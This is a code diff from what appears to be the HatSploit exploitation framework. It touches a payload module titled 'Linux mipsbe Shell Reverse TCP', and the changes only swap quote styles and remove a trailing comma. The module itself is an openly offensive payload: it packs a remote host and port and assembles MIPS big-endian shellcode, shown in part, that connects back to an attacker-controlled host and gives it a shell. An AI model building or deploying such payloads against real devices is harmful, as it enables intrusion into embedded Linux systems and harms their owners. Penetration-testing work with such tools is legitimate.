@@ -10,22 +10,22 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Assembler, Socket):
     details = {
-        "Name": "Linux mipsbe Shell Reverse TCP",
-        "Payload": "linux/mipsbe/shell_reverse_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "Shell reverse TCP payload for Linux mipsbe.",
-        "Architecture": "mipsbe",
-        "Platform": "linux",
-        "Rank": "high",
-        "Type": "reverse_tcp",
+        'Name': "Linux mipsbe Shell Reverse TCP",
+        'Payload': "linux/mipsbe/shell_reverse_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "Shell reverse TCP payload for Linux mipsbe.",
+        'Architecture': "mipsbe",
+        'Platform': "linux",
+        'Rank': "high",
+        'Type': "reverse_tcp",
     }
 
     def run(self):
-        rhost = self.pack_host(self.handler["RHOST"], "big")
-        rport = self.pack_port(self.handler["RPORT"], "big")
+        rhost = self.pack_host(self.handler['RHOST'], 'big')
+        rport = self.pack_port(self.handler['RPORT'], 'big')
 
         return self.assemble(
-            self.details["Architecture"],
+            self.details['Architecture'],
             f"""
             start:
                 addiu $t7, $zero, -6
@@ -80,5 +80,5 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 addiu $a1, $sp, -8
                 addiu $v0, $zero, 0xfab
                 syscall 0x40404
-            """,
+            """
         )
